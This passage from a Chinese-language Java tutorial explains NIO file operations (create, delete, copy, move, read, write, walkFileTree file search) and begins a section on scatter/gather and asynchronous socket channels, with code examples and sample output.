class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;fileWithPermissions.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">Set&lt;PosixFilePermission&gt; permissions = PosixFilePermissions.fromString(<span class="string">&quot;rw-r-----&quot;</span>);</span><br><span class="line">FileAttribute&lt;Set&lt;PosixFilePermission&gt;&gt; fileAttribute = PosixFilePermissions.asFileAttribute(permissions);</span><br><span class="line"></span><br><span class="line">Files.createFile(path, fileAttribute);</span><br></pre></td></tr></table></figure><p>PosixFileAttributes 接口提供了获取 POSIX 文件属性的方法，如文件所有者、文件所属的组以及文件的访问权限。以上示例会创建一个读写属性的文件。</p><p>3、<code>createDirectory(Path dir, FileAttribute&lt;?&gt;... attrs)</code>：创建一个新的目录。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">newDir</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;newDirectory&quot;</span>);</span><br><span class="line">Files.createDirectory(newDir);</span><br></pre></td></tr></table></figure><p>4、<code>delete(Path path)</code>：删除文件或目录。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">pathToDelete</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;fileToDelete.txt&quot;</span>);</span><br><span class="line">Files.delete(pathToDelete);</span><br></pre></td></tr></table></figure><p>5、<code>copy(Path source, Path target, CopyOption... options)</code>：复制文件或目录。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">sourcePath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;sourceFile.txt&quot;</span>);</span><br><span class="line"><span class="type">Path</span> <span class="variable">targetPath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;targetFile.txt&quot;</span>);</span><br><span class="line">Files.copy(sourcePath, targetPath, StandardCopyOption.REPLACE_EXISTING);</span><br></pre></td></tr></table></figure><p>在 Java NIO 中，有两个实现了 CopyOption 接口的枚举类：StandardCopyOption 和 LinkOption。</p><p>StandardCopyOption 枚举类提供了以下两个选项：</p><ul><li>REPLACE_EXISTING：如果目标文件已经存在，该选项会使 <code>Files.copy()</code> 方法替换目标文件。如果不指定此选项，<code>Files.copy()</code> 方法在目标文件已存在时将抛出 FileAlreadyExistsException。</li><li>COPY_ATTRIBUTES：此选项表示在复制文件时，尽可能地复制文件的属性（如文件时间戳、权限等）。如果不指定此选项，那么目标文件将具有默认的属性。</li></ul><p>6、<code>move(Path source, Path target, CopyOption... options)</code>：移动或重命名文件或目录。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">sourcePath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;sourceFile.txt&quot;</span>);</span><br><span class="line"><span class="type">Path</span> <span class="variable">targetPath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;targetFile.txt&quot;</span>);</span><br><span class="line">Files.move(sourcePath, targetPath, StandardCopyOption.REPLACE_EXISTING);</span><br></pre></td></tr></table></figure><p>7、<code>readAllLines(Path path, Charset cs)</code>：读取文件的所有行到一个字符串列表。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;file.txt&quot;</span>);</span><br><span class="line">List&lt;String&gt; lines = Files.readAllLines(path, StandardCharsets.UTF_8);</span><br><span class="line">lines.forEach(System.out::println);</span><br></pre></td></tr></table></figure><p>8、<code>write(Path path, Iterable&lt;? extends CharSequence&gt; lines, Charset cs, OpenOption... options)</code>：将字符串列表写入文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;file.txt&quot;</span>);</span><br><span class="line">List&lt;String&gt; lines = Arrays.asList(<span class="string">&quot;沉默王二 1&quot;</span>, <span class="string">&quot;沉默王二 2&quot;</span>, <span class="string">&quot;沉默王二 3&quot;</span>);</span><br><span class="line">Files.write(path, lines, StandardCharsets.UTF_8);</span><br></pre></td></tr></table></figure><p>OpenOption 是 Java NIO 中一个用于配置文件操作的接口。它提供了在使用 <code>Files.newByteChannel()</code>、<code>Files.newInputStream()</code>、<code>Files.newOutputStream()</code>、<code>AsynchronousFileChannel.open()</code> 和 <code>FileChannel.open()</code> 方法时定制行为的选项。</p><p>在 Java NIO 中，有两个实现了 OpenOption 接口的枚举类：StandardOpenOption 和 LinkOption。</p><p>StandardOpenOption 枚举类提供了以下几个选项：</p><ul><li>READ：以读取模式打开文件。</li><li>WRITE：以写入模式打开文件。</li><li>APPEND：以追加模式打开文件。</li><li>TRUNCATE_EXISTING：在打开文件时，截断文件的内容，使其长度为 0。仅适用于 WRITE 或 APPEND 模式。</li><li>CREATE：当文件不存在时创建文件。如果文件已存在，则打开文件。</li><li>CREATE_NEW：当文件不存在时创建文件。如果文件已存在，抛出 FileAlreadyExistsException。</li><li>DELETE_ON_CLOSE：在关闭通道时删除文件。</li><li>SPARSE：提示文件系统创建一个稀疏文件。</li><li>SYNC：要求每次更新文件的内容或元数据时都进行同步。</li><li>DSYNC：要求每次更新文件内容时都进行同步。</li></ul><p>8、<code>newBufferedReader(Path path, Charset cs) 和 newBufferedWriter(Path path, Charset cs, OpenOption... options)</code>：创建 BufferedReader 和 BufferedWriter 对象以读取和写入文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;file.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read file</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> Files.newBufferedReader(path, StandardCharsets.UTF_8)) &#123;</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        System.out.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write file</span></span><br><span class="line"><span class="type">Path</span> <span class="variable">outputPath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;outputFile.txt&quot;</span>);</span><br><span class="line"><span class="keyword">try</span> (<span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> Files.newBufferedWriter(outputPath, StandardCharsets.UTF_8)) &#123;</span><br><span class="line">    writer.write(<span class="string">&quot;沉默王二&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Files-walkFileTree-静态方法"><a href="#Files-walkFileTree-静态方法" class="headerlink" title="Files.walkFileTree() 静态方法"></a>Files.walkFileTree() 静态方法</h4><p>这个方法可以递归地访问目录结构中的所有文件和目录，并允许您对这些文件和目录执行自定义操作。使用 walkFileTree 方法时，需要提供一个起始路径（起始目录）和一个实现了 FileVisitor 接口的对象。FileVisitor 接口包含四个方法，它们在遍历过程中的不同阶段被调用：</p><ul><li>preVisitDirectory：在访问目录之前调用。</li><li>postVisitDirectory：在访问目录之后调用。</li><li>visitFile：在访问文件时调用。</li><li>visitFileFailed：在访问文件失败时调用。</li></ul><p>来看下面这个示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WalkFileTreeExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Path</span> <span class="variable">startingDir</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;docs&quot;</span>);</span><br><span class="line">        <span class="type">MyFileVisitor</span> <span class="variable">fileVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyFileVisitor</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Files.walkFileTree(startingDir, fileVisitor);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MyFileVisitor</span> <span class="keyword">extends</span> <span class="title class_">SimpleFileVisitor</span>&lt;Path&gt; &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> FileVisitResult <span class="title function_">preVisitDirectory</span><span class="params">(Path dir, BasicFileAttributes attrs)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;准备访问目录: &quot;</span> + dir);</span><br><span class="line">            <span class="keyword">return</span> FileVisitResult.CONTINUE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> FileVisitResult <span class="title function_">postVisitDirectory</span><span class="params">(Path dir, IOException exc)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;正在访问目录: &quot;</span> + dir);</span><br><span class="line">            <span class="keyword">return</span> FileVisitResult.CONTINUE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> FileVisitResult <span class="title function_">visitFile</span><span class="params">(Path file, BasicFileAttributes attrs)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;访问文件: &quot;</span> + file);</span><br><span class="line">            <span class="keyword">return</span> FileVisitResult.CONTINUE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> FileVisitResult <span class="title function_">visitFileFailed</span><span class="params">(Path file, IOException exc)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;访问文件失败: &quot;</span> + file);</span><br><span class="line">            <span class="keyword">return</span> FileVisitResult.CONTINUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">准备访问目录: docs</span><br><span class="line">访问文件: docs/安装环境.md</span><br><span class="line">准备访问目录: docs/imgs</span><br><span class="line">访问文件: docs/imgs/init_03.jpg</span><br><span class="line">准备访问目录: docs/imgs/itwanger</span><br><span class="line">访问文件: docs/imgs/itwanger/tongzhishu.jpeg</span><br><span class="line">访问文件: docs/imgs/itwanger/tongzhishu1.jpeg</span><br><span class="line">访问文件: docs/imgs/itwanger/tongzhishu1.pdf</span><br><span class="line">正在访问目录: docs/imgs/itwanger</span><br><span class="line">访问文件: docs/imgs/init_02.jpg</span><br><span class="line">访问文件: docs/imgs/init_00.jpg</span><br><span class="line">访问文件: docs/imgs/init_01.jpg</span><br><span class="line">访问文件: docs/imgs/init_04.jpg</span><br><span class="line">正在访问目录: docs/imgs</span><br><span class="line">访问文件: docs/服务器启动教程.md</span><br><span class="line">访问文件: docs/配套教程.md</span><br><span class="line">访问文件: docs/约定.md</span><br><span class="line">访问文件: docs/本地开发环境配置教程.md</span><br><span class="line">访问文件: docs/前端工程结构说明.md</span><br><span class="line">正在访问目录: docs</span><br></pre></td></tr></table></figure><p>在这个示例中，我们创建了一个名为 MyFileVisitor 的自定义 FileVisitor 类，它扩展了 SimpleFileVisitor 类。SimpleFileVisitor 是 FileVisitor 接口的一个实现，它提供了一些默认的行为。我们可以覆盖 SimpleFileVisitor 中的方法以实现自己的逻辑。在这个例子中，我们只是打印出了访问的文件和目录。然后，我们使用 Files.walkFileTree 方法遍历文件树。这个方法会遍历整个目录结构，并调用 MyFileVisitor 中的相应方法。</p><p>其中，FileVisitResult 枚举包含以下四个选项：</p><ul><li>CONTINUE ： 继续</li><li>TERMINATE ： 终止</li><li>SKIP_SIBLINGS ： 跳过兄弟节点，然后继续</li><li>SKIP_SUBTREE ： 跳过子树（不访问此目录的条目），然后继续，仅在 preVisitDirectory 方法返回时才有意义，除此以外和 CONTINUE 相同。</li></ul><h4 id="搜索文件"><a href="#搜索文件" class="headerlink" title="搜索文件"></a>搜索文件</h4><p><code>walkFileTree()</code> 方法还可以用于搜索文件，下面这个例子扩展了 SimpleFileVisitor 来查找一个名为 itwanger.txt 的文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FindFileWithWalkFileTree</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Path</span> <span class="variable">startingDir</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;logs&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">targetFileName</span> <span class="operator">=</span> <span class="string">&quot;itwanger.txt&quot;</span>;</span><br><span class="line">        <span class="type">FindFileVisitor</span> <span class="variable">findFileVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FindFileVisitor</span>(targetFileName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Files.walkFileTree(startingDir, findFileVisitor);</span><br><span class="line">            <span class="keyword">if</span> (findFileVisitor.isFileFound()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;找到文件了: &quot;</span> + findFileVisitor.getFoundFilePath());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;ooh，文件没找到&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">FindFileVisitor</span> <span class="keyword">extends</span> <span class="title class_">SimpleFileVisitor</span>&lt;Path&gt; &#123;</span><br><span class="line">        <span class="keyword">private</span> String targetFileName;</span><br><span class="line">        <span class="keyword">private</span> Path foundFilePath;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">FindFileVisitor</span><span class="params">(String targetFileName)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.targetFileName = targetFileName;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isFileFound</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> foundFilePath != <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Path <span class="title function_">getFoundFilePath</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> foundFilePath;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> FileVisitResult <span class="title function_">visitFile</span><span class="params">(Path file, BasicFileAttributes attrs)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> file.getFileName().toString();</span><br><span class="line">            <span class="keyword">if</span> (fileName.equals(targetFileName)) &#123;</span><br><span class="line">                foundFilePath = file;</span><br><span class="line">                <span class="keyword">return</span> FileVisitResult.TERMINATE;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> FileVisitResult.CONTINUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在主方法中，我们使用 Files.walkFileTree 方法遍历文件树，并传递一个起始目录和 FindFileVisitor 实例。遍历完成后，我们检查是否找到了目标文件，如果找到了，就打印出它的路径。##</p><h2 id="NIO实现网络聊天室"><a href="#NIO实现网络聊天室" class="headerlink" title="NIO实现网络聊天室"></a>NIO实现网络聊天室</h2><h3 id="Scatter-和-Gather"><a href="#Scatter-和-Gather" class="headerlink" title="Scatter 和 Gather"></a>Scatter 和 Gather</h3><p>Scatter 和 Gather 是 Java NIO 中两种高效的 I&#x2F;O 操作，用于将数据分散到多个缓冲区或从多个缓冲区中收集数据。</p><p>Scatter（分散）：它将从 Channel 读取的数据分散（写入）到多个缓冲区。这种操作可以在读取数据时将其分散到不同的缓冲区，有助于处理结构化数据。例如，我们可以将消息头、消息体和消息尾分别写入不同的缓冲区。<br>Gather（聚集）：与 Scatter 相反，它将多个缓冲区中的数据聚集（读取）并写入到一个 Channel。这种操作允许我们在发送数据时从多个缓冲区中聚集数据。例如，我们可以将消息头、消息体和消息尾从不同的缓冲区中聚集到一起并写入到同一个 Channel。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 服务端</span></span><br><span class="line"><span class="comment">// 创建一个ServerSocketChannel</span></span><br><span class="line"><span class="type">ServerSocketChannel</span> <span class="variable">serverSocketChannel</span> <span class="operator">=</span> ServerSocketChannel.open();</span><br><span class="line">serverSocketChannel.socket().bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">9000</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接受连接</span></span><br><span class="line"><span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> serverSocketChannel.accept();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Scatter：分散读取数据到多个缓冲区</span></span><br><span class="line"><span class="type">ByteBuffer</span> <span class="variable">headerBuffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">128</span>);</span><br><span class="line"><span class="type">ByteBuffer</span> <span class="variable">bodyBuffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">ByteBuffer[] buffers = &#123;headerBuffer, bodyBuffer&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="variable">bytesRead</span> <span class="operator">=</span> socketChannel.read(buffers);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出缓冲区数据</span></span><br><span class="line">headerBuffer.flip();</span><br><span class="line"><span class="keyword">while</span> (headerBuffer.hasRemaining()) &#123;</span><br><span class="line">    System.out.print((<span class="type">char</span>) headerBuffer.get());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">System.out.println();</span><br><span class="line"></span><br><span class="line">bodyBuffer.flip();</span><br><span class="line"><span class="keyword">while</span> (bodyBuffer.hasRemaining()) &#123;</span><br><span class="line">    System.out.print((<span class="type">char</span>) bodyBuffer.get());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Gather：聚集数据从多个缓冲区写入到Channel</span></span><br><span class="line"><span class="type">ByteBuffer</span> <span class="variable">headerResponse</span> <span class="operator">=</span> ByteBuffer.wrap(<span class="string">&quot;Header Response&quot;</span>.getBytes());</span><br><span class="line"><span class="type">ByteBuffer</span> <span class="variable">bodyResponse</span> <span class="operator">=</span> ByteBuffer.wrap(<span class="string">&quot;Body Response&quot;</span>.getBytes());</span><br><span class="line"></span><br><span class="line">ByteBuffer[] responseBuffers = &#123;headerResponse, bodyResponse&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="variable">bytesWritten</span> <span class="operator">=</span> socketChannel.write(responseBuffers);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭连接</span></span><br><span class="line">socketChannel.close();</span><br><span class="line">serverSocketChannel.close();</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 客户端</span></span><br><span class="line"><span class="comment">// 创建一个SocketChannel</span></span><br><span class="line"><span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> SocketChannel.open();</span><br><span class="line">socketChannel.connect(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">9000</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送数据到服务器</span></span><br><span class="line"><span class="type">String</span> <span class="variable">header</span> <span class="operator">=</span> <span class="string">&quot;Header Content&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;Body Content&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">ByteBuffer</span> <span class="variable">headerBuffer</span> <span class="operator">=</span> ByteBuffer.wrap(header.getBytes());</span><br><span class="line"><span class="type">ByteBuffer</span> <span class="variable">bodyBuffer</span> <span class="operator">=</span> ByteBuffer.wrap(body.getBytes());</span><br><span class="line"></span><br><span class="line">ByteBuffer[] buffers = &#123;headerBuffer, bodyBuffer&#125;;</span><br><span class="line">socketChannel.write(buffers);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从服务器接收数据</span></span><br><span class="line"><span class="type">ByteBuffer</span> <span class="variable">headerResponseBuffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">128</span>);</span><br><span class="line"><span class="type">ByteBuffer</span> <span class="variable">bodyResponseBuffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">ByteBuffer[] responseBuffers = &#123;headerResponseBuffer, bodyResponseBuffer&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="variable">bytesRead</span> <span class="operator">=</span> socketChannel.read(responseBuffers);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出接收到的数据</span></span><br><span class="line">headerResponseBuffer.flip();</span><br><span class="line"><span class="keyword">while</span> (headerResponseBuffer.hasRemaining()) &#123;</span><br><span class="line">    System.out.print((<span class="type">char</span>) headerResponseBuffer.get());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bodyResponseBuffer.flip();</span><br><span class="line"><span class="keyword">while</span> (bodyResponseBuffer.hasRemaining()) &#123;</span><br><span class="line">    System.out.print((<span class="type">char</span>) bodyResponseBuffer.get());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭连接</span></span><br><span class="line">socketChannel.close();</span><br></pre></td></tr></table></figure><h3 id="异步套接字通道-AsynchronousSocketChannel-和-AsynchronousServerSocketChannel"><a href="#异步套接字通道-AsynchronousSocketChannel-和-AsynchronousServerSocketChannel" class="headerlink" title="异步套接字通道 AsynchronousSocketChannel 和 AsynchronousServerSocketChannel"></a>异步套接字通道 AsynchronousSocketChannel 和 AsynchronousServerSocketChannel</h3><p>AsynchronousSocketChannel 和 AsynchronousServerSocketChannel 是 Java 7 引入的异步 I&#x2F;O 类，分别用于处理异步客户端 Socket 和服务器端 ServerSocket。异步 I&#x2F;O 允许在 I&#x2F;O 操作进行时执行其他任务，并在操作完成时接收通知，提高了并发处理能力。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AsynchronousServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="type">AsynchronousServerSocketChannel</span> <span class="variable">server</span> <span class="operator">=</span> AsynchronousServerSocketChannel.open();</span><br><span class="line">        server.bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">5000</span>));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;服务器启动&quot;</span>);</span><br><span class="line"></span><br><span class="line">        server.accept(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">CompletionHandler</span>&lt;AsynchronousSocketChannel, Void&gt;() &#123;</span><br><span class="line">            <span 